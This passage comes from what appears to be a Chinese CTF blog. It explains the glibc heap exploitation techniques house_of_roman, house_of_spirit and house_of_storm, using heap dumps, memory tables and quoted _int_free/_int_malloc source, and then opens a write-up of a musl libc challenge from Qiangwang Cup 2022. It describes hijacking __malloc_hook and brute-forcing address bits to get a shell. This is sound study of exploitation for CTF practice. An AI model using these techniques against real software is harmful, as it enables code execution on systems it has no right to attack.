class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757170</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7ffff7bcdb78</span><br><span class="line">bk: 0x7ffff7bcdb78</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins)</span><br><span class="line">Addr: 0x555555757190</span><br><span class="line">Size: 0x70</span><br><span class="line">fd: 0x00</span><br></pre></td></tr></table></figure>

<p>之后，将第一个chunk的fd指针部分覆盖（覆盖最低1字节为0），那么此时第一个chunk指向的就是0x555555757100处，也就是刚分配的0x70空间的首部。此操作完成之后，堆结构变为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757000</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x555555757100</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555757070</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Free chunk (fastbins) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757100</span><br><span class="line">Size: 0x71</span><br><span class="line">fd: 0x7ffff7bcdbf8</span><br><span class="line"></span><br><span class="line">Free chunk (unsortedbin) | PREV_INUSE</span><br><span class="line">Addr: 0x555555757170</span><br><span class="line">Size: 0x21</span><br><span class="line">fd: 0x7ffff7bcdb78</span><br><span class="line">bk: 0x7ffff7bcdb78</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x555555757190</span><br><span class="line">Size: 0x70</span><br></pre></td></tr></table></figure>

<p>bins的结构为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x555555757000 —▸ 0x555555757100 —▸ 0x7ffff7bcdbf8 (main_arena+216) ◂— 0x7ffff7bcdbf8</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555757170 —▸ 0x7ffff7bcdb78 (main_arena+88) ◂— 0x555555757170 /* &#x27;pquUUU&#x27; */</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<p>之后，我们就可以将0x555555757100（此时实际上并不是freed chunk）的fd指针修改为malloc_hook - 0x23。但是由于开启了PIE，因此需要爆破4个比特位，即16选1。</p>
<font color=red>
注意：PIE会对地址进行随机化处理，但是一页之内的地址还是一样的，也就是说，开启和不开启PIE时地址的最低12bit是完全相同的。我们可以获取libc中malloc_hook的相对地址，其低12bit可以获得，但覆盖是整个字节覆盖，因此我们需要猜解随机化地址的倒数第2低字节中的高4位。
</font>

<p>覆盖地址为0x555555757100的chunk的fd指针的低2字节，如果爆破成功，后面连续分配两个0x70大小chunk后再分配一个即将fastbin挟持到__malloc_hook。</p>
<p>这是__malloc_hook前面一部分内存空间的情况。</p>
<table>
<thead>
<tr>
<th align="center">addr</th>
<th align="center">+0</th>
<th align="center">+1</th>
<th align="center">+2</th>
<th align="center">+3</th>
<th align="center">+4</th>
<th align="center">+5</th>
<th align="center">+6</th>
<th align="center">+7</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0x7ffff7bcdae8</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
</tr>
<tr>
<td align="center">0x7ffff7bcdaf0(_IO_wide_data_0+304)</td>
<td align="center">60</td>
<td align="center">c2</td>
<td align="center">bc</td>
<td align="center">f7</td>
<td align="center">ff</td>
<td align="center"><font color=red>7f</font></td>
<td align="center"><font color=red>00</font></td>
<td align="center"><font color=red>00</font></td>
</tr>
<tr>
<td align="center">0x7ffff7bcdaf8</td>
<td align="center"><font color=red>00</font></td>
<td align="center"><font color=red>00</font></td>
<td align="center"><font color=red>00</font></td>
<td align="center"><font color=red>00</font></td>
<td align="center"><font color=red>00</font></td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
</tr>
<tr>
<td align="center">0x7ffff7bcdb00(__memalign_hook)</td>
<td align="center">a0</td>
<td align="center">ee</td>
<td align="center">88</td>
<td align="center">f7</td>
<td align="center">ff</td>
<td align="center">7f</td>
<td align="center">00</td>
<td align="center">00</td>
</tr>
<tr>
<td align="center">0x7ffff7bcdb08(__realloc_hook)</td>
<td align="center">70</td>
<td align="center">ea</td>
<td align="center">88</td>
<td align="center">f7</td>
<td align="center">ff</td>
<td align="center">7f</td>
<td align="center">00</td>
<td align="center">00</td>
</tr>
<tr>
<td align="center">0x7ffff7bcdb10(__malloc_hook)</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
</tr>
</tbody></table>
<p>我们现在解释为什么要将地址挟持到__malloc_hook - 0x23处。</p>
<font color=red>
fastbin的重新分配会进行一个检查：后面一个fastbin的大小是否在fastbin可以容纳的chunk的大小范围之内。因此我们需要转移到一个这样一个地址，这个地址后面对应的size域有一个0x20~0x80的值。看到上面的表，我们想借用7f。如何借用？注意到0x7ffff7bcdaf5处有一个7f（这个7f一般是固定不变的），而且这之后有10个字节都是0，如果我们从这里开始读8个字节，那值就正好是0x7f，不会超过0x80。所以考虑将0x7ffff7bcdaed作为chunk的头部，这样读取到的size就可以通过检查。
</font>

<h2 id="Step-2-Unsorted-bin-attack"><a href="#Step-2-Unsorted-bin-attack" class="headerlink" title="Step 2: Unsorted bin attack"></a>Step 2: Unsorted bin attack</h2><p>在第一步中，我们成功将fastbin挟持到了__malloc_hook处。但是由于libc的加载地址仍然未知，现在我们能做的仍然非常有限。因此下一步我们准备进行一次unsorted bin attack。</p>
<p>首先分配一个0x90大小的chunk(name: unsorted_bin_ptr)，之后分配一个0x30大小的chunk防止unsorted bin与top chunk合并。下面就是常规的unsorted bin attack流程：</p>
<p>释放unsorted_bin_ptr，利用UAF将其bk指针修改为__malloc_hook - 0x10（这里只需要修改最低2字节，而且这在第一步已经通过爆破获取）。然后将这个unsorted bin分配出来，这样main_arena + 0x68被修改为__malloc_hook - 0x10，同时__malloc_hook被修改为main_arena + 0x68（这是双向链表中元素脱链的标准操作，即要脱链的为chunk，则需将chunk-&gt;bk-&gt;fd指向main_arena + 0x68，main_arena + 0x68指向chunk-&gt;bk，图示如下）</p>
<p><img src="https://img-blog.csdnimg.cn/59b52215ec91403bb1f2eccb62afe289.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQWdDbOKGkQ==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
<h2 id="Step-3-getshell"><a href="#Step-3-getshell" class="headerlink" title="Step 3: getshell"></a>Step 3: getshell</h2><p>之后，我们需要利用挟持到__malloc_hook的chunk部分修改__malloc_hook的值。首先，我们在第一步已经通过爆破获取了__malloc_hook地址的低2字节，根据这低2字节，我们可以在libc中获取到system加载地址的低2字节。</p>
<p>例如，libc6_2.23-0ubuntu11.3_amd64版本中system地址为0x453a0，__malloc_hook地址为0x3c4b10。假如爆破成功时__malloc_hook加载地址的低2字节为0x8b10，那么说明加载地址等于相对地址加上(0x400 + n * 0x1000)。即system加载地址的低2字节应为0x93a0。</p>
<p>我们获取到system地址的低2字节后，需要爆破system地址第3小的字节。注意到0x3c4b10 - 0x453a0 &#x3D; 0x37f770，system的地址和__malloc_hook的地址除低3字节外剩余部分很有可能相等。因此只对第3小的字节进行爆破即可。</p>
<p>随机猜解system地址如果成功，在之后进行malloc，参数可以填one_gadget，这样就可以成功获取shell。</p>
<p>综上所述，house_of_roman一共需要爆破12比特位，加上加载地址可能造成的影响，爆破成功的概率应该略低于 1 &#x2F; 2^12，多试几次就可以getshell。</p>
<h1 id="10-house-of-spirit"><a href="#10-house-of-spirit" class="headerlink" title="10. house_of_spirit"></a>10. house_of_spirit</h1><p>这是一种常用的堆漏洞，核心思想也很简单：在目标地址伪造一个chunk并引导libc将这块内存释放，下一次malloc即可分配到目标地址处。</p>
<p>这里需要注意的就是伪造堆块的方法。</p>
<h2 id="重要：-int-free函数的fastbin检查："><a href="#重要：-int-free函数的fastbin检查：" class="headerlink" title="重要：_int_free函数的fastbin检查："></a>重要：_int_free函数的fastbin检查：</h2><ol>
<li><p>检查堆块的size是否过大到不切实际</p>
</li>
<li><p>检查chunk是否对齐（x64的chunk头必须是0x8对齐的，即最低4bit只能为0或8）</p>
</li>
</ol>
<p>上述两种检查如果没有通过，直接报错中止，源码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">size = chunksize (p);</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">      || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>检查size是否过小以及size是否对齐，即size不能小于0x20且在x64中也要是0x8对齐，否则报错中止。源码如下：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>检查下一个chunk的大小，不能小于<code>2 * SIZE_SZ</code>（即0x10），也不能大于<code>av-&gt;system_mem</code>（应该是一个很大的值），源码如下：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">	|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">			     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">	   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">	   after getting the lock.  */</span></span><br><span class="line">	<span class="keyword">if</span> (have_lock</span><br><span class="line">	    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">		  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">		  locked = <span class="number">1</span>;</span><br><span class="line">		  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">		    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">	      &#125;))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="keyword">if</span> (! have_lock)</span><br><span class="line">	  &#123;</span><br><span class="line">	    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">	    locked = <span class="number">0</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>检查fastbin的第一个chunk是否是当前释放的chunk，防止double free。源码如下：</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">	<span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">	   (i.e., double free).  */</span></span><br><span class="line">	<span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">	  &#123;</span><br><span class="line">	    errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">	    <span class="keyword">goto</span> errout;</span><br><span class="line">	  &#125;</span><br><span class="line">	<span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">	   size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">	   only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">	   deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">	<span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">	  old_idx = fastbin_index(chunksize(old));</span><br><span class="line">	p-&gt;fd = old2 = old;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br></pre></td></tr></table></figure>

<p>在house_of_spirit中，第2个检查一般都是满足的，绕过第1个检查需要将目标地址看做一个chunk，对应size的地址处应该写入一个0x20~0x80且能够被0x8整除的数，以绕过第1, 3个检查。第4个检查的绕过需要一些小技巧。假设在目标地址处我们可以控制0x60的空间，那么我们的size不应该写成0x60而是小于0x60，这样方便我们在后面伪造next chunk的size。第5个检查一般没有问题。</p>
<p>所有这些工作做好之后，就可以先释放再分配了。分配完成后就可以在目标地址处获取一个chunk。一般来说house_of_spirit是作为跳板来使用的，在目标地址获取chunk能够很好地为其他攻击手段做准备。</p>
<h1 id="11-house-of-storm"><a href="#11-house-of-storm" class="headerlink" title="11. house_of_storm"></a>11. house_of_storm</h1><p>关于此利用方式，源码中的说明是可以向用户返回任意一个chunk。</p>
<p>首先，程序分配了两个chunk，一个进入unsorted bin，一个进入large bins，且unsorted bin中的chunk大小大于large bins中的chunk。在源码中，unsorted bin chunk的大小设定为0x4f0，同时分配一个小chunk防止其在释放时与top chunk合并。</p>
<p>之后，源码中以这个chunk的最高非0字节为参考，计算了需要分配的chunk的大小。将最低1bit置0（因为这里在chunk的size中代表的是prev_in_use标志位），这里需要进行检查：最低1字节的bit-3不能为1，若bit-2为1则bit-1不能为0，至于原因，后面会提到。</p>
<p>如果上述检查通过，则进行接下来的操作。分配一个大小为0x4e0的chunk，再加上一个小chunk防止与top chunk合并。之后释放0x4e0大小的chunk和0x4f0大小的chunk（这里注意要首先释放较小的chunk），然后分配一个0x4f0大小的chunk。这样由于<font color=red><strong>unsorted bin在malloc时遵循先进先出的队列结构</strong></font>，会首先检查到小chunk，而小chunk大小不足，会被链入到large bins中。然后再将0x4f0大小的chunk释放，返还到unsorted bin中，bins的环境就构造完成了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x603000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603000</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x4c0: 0x603510 —▸ 0x7ffff7dd1f98 (main_arena+1144) ◂— 0x603510</span><br></pre></td></tr></table></figure>

<p>然后，我们需要使用unsorted bin attack，覆盖unsorted bin chunk的bk指针为(目标地址 - 0x10)处，覆盖large bin chunk的bk指针到(目标地址 - 0x8)处，覆盖large bin chunk的bk_nextsize。之后，malloc即可获取目标地址的chunk。</p>
<p>但是，为什么会这样呢？这需要从_int_malloc函数中寻找答案。</p>
<h2 id="本漏洞利用中-int-malloc函数中重要步骤："><a href="#本漏洞利用中-int-malloc函数中重要步骤：" class="headerlink" title="本漏洞利用中_int_malloc函数中重要步骤："></a>本漏洞利用中_int_malloc函数中重要步骤：</h2><p>参考博客（有分析全过程）：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41453285/article/details/99005759?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164652688616780265470085%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=164652688616780265470085&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-99005759.pc_search_result_control_group&utm_term=int_malloc&spm=1018.2226.3001.4187">_int_malloc函数详解</a></p>
<ol>
<li><p>如果申请大小在fastbin范围则从fastbin中查找是否有合适的chunk。</p>
</li>
<li><p>如果申请大小在small bins范围则从small bins中查找是否有合适的chunk。</p>
</li>
<li><p>前2步没有找到调用malloc_consolidate函数整理堆块</p>
</li>
<li><p>大循环：</p>
<p> (1) 从unsorted bin中获取当前遍历到的chunk<br> (2) 如果申请大小在small bins范围且last remainder可以切割一部分给申请堆块，则切割后返回<br> (3) 如果申请大小正好等于当前遍历到chunk的大小，则直接返回</p>
 <font color=red>
 (4) 将当前unsorted bin chunk放入small bins或large bins中：
 如果当前遍历到的unsorted bin chunk的大小属于small bins范围则放入对应的small bin中。
 如果属于large bins范围，则需要进行一些处理：
 因为large bins中的每一个bin里面的chunk大小均是一个范围值而不是固定值，所以libc会对每一个large bin中的chunk按照大小进行排序，large bin chunk的fd和bk指针指向前后chunk，而fd_nextsize和bk_nextsize指向前后第一个与该chunk大小不同的chunk，便于遍历。所以，libc会遍历该large bin并将这个原本在unsorted bin中的chunk放入正确的位置。在house of storm中，至关重要的就是下面的入链操作：
 </font></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">victim-&gt;fd_nextsize = fwd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br></pre></td></tr></table></figure>

<p>这里要尤其注意第4条语句，这是唯一一条修改目标地址值的语句。<br>（victim &#x3D; unsorted bin chunk，fwd &#x3D; large bin chunk）</p>
<p>在此之前，分别位于unsorted bin和large bins的两个chunk的构造如下：</p>
<p>unsorted bin chunk:</p>
<table>
<thead>
<tr>
<th align="center">addr</th>
<th align="center">+0x0</th>
<th align="center">+0x8</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0x603000</td>
<td align="center">0</td>
<td align="center">0x4f1(size)</td>
</tr>
<tr>
<td align="center">0x603010</td>
<td align="center">main_arena + 0x68</td>
<td align="center">target-0x10</td>
</tr>
<tr>
<td align="center">0x603020</td>
<td align="center">0</td>
<td align="center">0</td>
</tr>
</tbody></table>
<p>large bin chunk:</p>
<table>
<thead>
<tr>
<th align="center">addr</th>
<th align="center">+0x0</th>
<th align="center">+0x8</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0x603510</td>
<td align="center">0</td>
<td align="center">0x4e1(size)</td>
</tr>
<tr>
<td align="center">0x603520</td>
<td align="center">main_arena + 1144</td>
<td align="center">target-0x8</td>
</tr>
<tr>
<td align="center">0x603530</td>
<td align="center">0x603510(fd_nextsize)</td>
<td align="center">target-0x2a(bk_nextsize)</td>
</tr>
</tbody></table>
<p>在执行完上述4步之后，结构变为：</p>
<p>unsorted bin chunk:</p>
<table>
<thead>
<tr>
<th align="center">addr</th>
<th align="center">+0x0</th>
<th align="center">+0x8</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0x603000</td>
<td align="center">0</td>
<td align="center">0x4f1(size)</td>
</tr>
<tr>
<td align="center">0x603010</td>
<td align="center">main_arena + 0x68</td>
<td align="center">target-0x8</td>
</tr>
<tr>
<td align="center">0x603020</td>
<td align="center"><font color=red>0x603510</font></td>
<td align="center"><font color=red>target-0x2a</font></td>
</tr>
</tbody></table>
<p>large bin chunk:</p>
<table>
<thead>
<tr>
<th align="center">addr</th>
<th align="center">+0x0</th>
<th align="center">+0x8</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0x603510</td>
<td align="center">0</td>
<td align="center">0x4e1(size)</td>
</tr>
<tr>
<td align="center">0x603520</td>
<td align="center">main_arena + 1144</td>
<td align="center">target-0x8</td>
</tr>
<tr>
<td align="center">0x603530</td>
<td align="center">0x603510</td>
<td align="center"><font color=red>0x603000</font></td>
</tr>
</tbody></table>
<p>同时(target-0x2a)-&gt;fd_nextsize被写入为0x603000，也即target-0xa处被写入为0x603000：</p>
<table>
<thead>
<tr>
<th align="center">addr</th>
<th align="center">0</th>
<th align="center">1</th>
<th align="center">2</th>
<th align="center">3</th>
<th align="center">4</th>
<th align="center">5</th>
<th align="center">6</th>
<th align="center">7</th>
</tr>
</thead>
<tbody><tr>
<td align="center">target-0x10</td>
<td align="center">–</td>
<td align="center">–</td>
<td align="center">–</td>
<td align="center">–</td>
<td align="center">–</td>
<td align="center">–</td>
<td align="center"><font color=red>00</font></td>
<td align="center"><font color=red>30</font></td>
</tr>
<tr>
<td align="center">target-0x8</td>
<td align="center"><font color=red>60</font></td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
<td align="center">00</td>
</tr>
<tr>
<td align="center">target</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">target+0x8</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
</tbody></table>
<p>如果将target-0x10看做chunk头，那么这里正好写入了一个正确的size，即0x60！这也就能够解释为什么源代码一开始要将unsorted bin chunk地址的高位作为size，且需要通过一系列检查了。通过了一系列检查，然后像这样错位写入，就正好能够伪造正确的size！这样，_int_malloc函数就能够为我们返回这个地方的地址了。</p>
<p>对于这个漏洞的利用的理解需要对_int_malloc函数有充分的理解，利用unsorted bin chunk被链入到large bins的过程对堆结构进行攻击。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94UserManager/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94UserManager/" class="post-title-link" itemprop="url">强网杯2022 pwn 赛题解析——UserManager</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:28:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:28:00+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>刚刚结束的2022年强网杯中有一道题用到了musl libc，但是之前没有接触过，只能遗憾跳过。本文根据musl libc 1.2.2的源码，和赛题本身，学习一下musl libc的利用方式。</p>
<p>musl libc 是一种轻量级的libc，可以用于嵌入式设备等，其中包含malloc、free等一系列函数的实现都与glibc相差甚远。但由于其轻量化的定位，其实现的代码量也相对较少，便于我们通过源码进行直接分析。</p>
<p>本文主要参考资料：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269533.htm">资料</a></p>
<h1 id="UserManager"><a href="#UserManager" class="headerlink" title="UserManager"></a>UserManager</h1><p>本题的musl版本是1.2.2，在新版的Ubuntu 22.04中下载的musl默认版本为1.2.2-4。</p>
<h2 id="1-逆向分析程序"><a href="#1-逆向分析程序" class="headerlink" title="1. 逆向分析程序"></a>1. 逆向分析程序</h2><p>用IDA打开之后，发现其中的符号表大多还在，省去了重命名函数的时间。在Menu函数中，我们可以得知这个程序能够实现的功能有：Add、Check、Delete、Clear。下面依次进行分析。</p>
<h3 id="主要数据结构"><a href="#主要数据结构" class="headerlink" title="主要数据结构"></a>主要数据结构</h3><p>本题中涉及的数据结构是红黑树。结构体定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">00000000 chunk_info      struc ; (sizeof=0x38, mappedto_6)</span><br><span class="line">00000000 Id              dq ?</span><br><span class="line">00000008 name_chunk      dq ?                    ; offset</span><br><span class="line">00000010 name_len        dq ?</span><br><span class="line">00000018 color           dq ?                    ; enum node_type</span><br><span class="line">00000020 parent          dq ?                    ; offset</span><br><span class="line">00000028 right_child     dq ?                    ; offset</span><br><span class="line">00000030 left_child      dq ?                    ; offset</span><br><span class="line">00000038 chunk_info      ends</span><br><span class="line"></span><br><span class="line">FFFFFFFF ; enum node_type, mappedto_8, width 8 bytes</span><br><span class="line">FFFFFFFF red              = 1</span><br><span class="line">FFFFFFFF black            = 2</span><br></pre></td></tr></table></figure>
<p>那么在初次逆向程序时，我们应该如何得知本题的数据结构是红黑树呢？其重点就在于字段<code>color</code>功能的判断。在<code>insert</code>函数、<code>doing</code>函数、<code>delete</code>函数中，只有当<code>color</code>表示红黑树中结点的颜色时才能将程序的逻辑解释清楚。这需要一定的直觉与经验，也对我们的逆向能力做出了一定的要求。</p>
